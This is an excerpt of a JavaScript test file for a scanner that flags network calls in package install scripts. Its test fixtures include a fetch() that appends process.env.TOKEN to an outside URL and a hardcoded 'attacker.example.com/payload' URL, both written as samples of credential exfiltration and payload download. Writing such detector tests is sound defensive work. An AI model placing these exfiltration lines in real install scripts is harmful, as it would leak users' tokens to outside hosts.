...
describe('analyzeNetworkCalls', () => {
    ...
    it('detects fetch() call', () => {
        const findings = analyzeNetworkCalls(makeContext(`fetch('https://example.com/collect?t=' + process.env.TOKEN)`));
        assert.ok(findings.some((f) => f.category === 'install-script-network'));
    });
    ...
    it('detects hardcoded http:// URL string literal', () => {
        const findings = analyzeNetworkCalls(makeContext(`const url = 'https://attacker.example.com/payload'`));
    ...
    it('does not flag normal imports without network modules', () => {
        const findings = analyzeNetworkCalls(makeContext(`
        const fs = require('fs');
    ...
    it('does not flag regular strings that are not URLs', () => {
        const findings = analyzeNetworkCalls(makeContext(`const msg = 'install complete'`));
        assert.equal(findings.filter(f => f.category === 'install-script-network').length, 0);
    });
});
//# sourceMappingURL=network-calls.test.js.map